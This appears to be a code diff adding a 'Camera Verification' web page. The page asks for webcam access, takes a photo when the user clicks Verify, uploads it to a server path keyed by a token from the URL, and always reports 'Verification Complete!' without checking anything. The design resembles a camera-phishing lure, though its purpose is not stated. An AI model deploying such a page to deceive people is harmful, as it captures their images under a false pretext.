@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Verification</title>
+</head>
+<body style="text-align:center;">
+  <h2>Camera Verification</h2>
+
+  <video id="video" autoplay></video>
+  <br><br>
+
+  <button onclick="capture()">Verify</button>
+  <p id="status"></p>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const status = document.getElementById("status");
+
+    const token = window.location.pathname.split("/").pop();
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .catch(() => status.innerText = "Camera permission denied");
+
+    function capture() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append("photo", blob);
+
+        fetch("/api/upload/" + token, {
+          method: "POST",
+          body: form
+        });
+
+        status.innerText = "✅ Verification Complete!";
+      });
+    }
+  </script>
+</body>
+</html>
